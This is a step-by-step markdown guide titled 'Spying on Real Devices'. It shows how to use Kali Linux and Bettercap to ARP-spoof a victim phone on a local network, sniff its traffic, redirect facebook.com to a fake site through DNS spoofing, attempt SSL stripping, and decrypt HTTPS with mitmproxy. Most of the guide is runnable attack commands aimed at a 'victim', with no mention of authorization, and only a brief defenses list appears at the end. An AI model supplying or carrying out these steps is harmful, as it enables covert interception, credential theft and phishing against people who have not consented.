## WHAT YOU CAN DO IN A REAL NETWORK

### You *CAN*:

* Perform **ARP spoofing** between router and target
* Capture **DNS queries**, **unencrypted HTTP**, and **some app metadata**
* Try **SSL stripping** (if target uses HTTP or ignores HSTS)
* Log **hostnames**, **IP connections**, and **open ports**

### You *CANNOT*:

* See HTTPS passwords easily (most apps/sites use HSTS or certificate pinning)
* Decrypt traffic from apps like Instagram, WhatsApp, Gmail without installing your **root certificate** on the device (risky and hard to scale)


## GUIDE: SPYING ON REAL DEVICES

### 1. Connect Kali to the Same Router

* Wi-Fi: `wlan0` interface
* Ethernet: `eth0` interface
* Find your local IP:

  ```bash
  ip a
  ```



### 2. Scan the Network

```bash
sudo arp-scan --localnet
```

Find the target device IP (e.g., Android phone: `192.168.0.105`) and the router (e.g., `192.168.0.1`).



### 3. Start Bettercap

```bash
sudo bettercap -iface wlan0
```



### 4. Enable ARP Spoofing (Victim + Router)

```bash
set arp.spoof.targets 192.168.0.105
arp.spoof on
set net.ipv4.forwarding true
```



### 5. Start Sniffing Traffic

```bash
net.sniff on
set net.sniff.verbose true
```



### 6. Optional Modules to Try

#### DNS Spoof

Redirect a site to fake one:

```bash
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.0.100  # your fake site
dns.spoof on
```

#### HTTPS Strip (rarely works due to HSTS)

```bash
https.proxy on
https.strip on
```

> Most phones will reject SSL-stripped traffic. Modern Android/iOS requires installing a custom CA cert to MITM HTTPS traffic.



## Better Success with These:

| Protocol           | Info Captured               | Tool      |
| ------------------ | --------------------------- | --------- |
| **DNS**            | Website names               | Bettercap |
| **HTTP**           | Forms, credentials, cookies | Bettercap |
| **FTP/Telnet**     | Plaintext logins            | Wireshark |
| **Unsecured apps** | Token leakage or API calls  | mitmproxy |



## Want Full HTTPS Decryption from Phones?

To go deeper:

1. Set up **mitmproxy** on Kali
2. Route phone traffic through proxy
3. Install mitmproxy’s CA cert on the phone manually
4. Only then can HTTPS be decrypted (no HSTS/CSP pinning)



## DEFENSES AGAINST THIS

* Use VPN on all devices (tunnels past local MITM)
* HSTS and TLS pinning (used by most modern apps)
* ARP spoof detection (e.g., `arpwatch`, `Snort`)
* Use WPA3 and guest networks for untrusted users
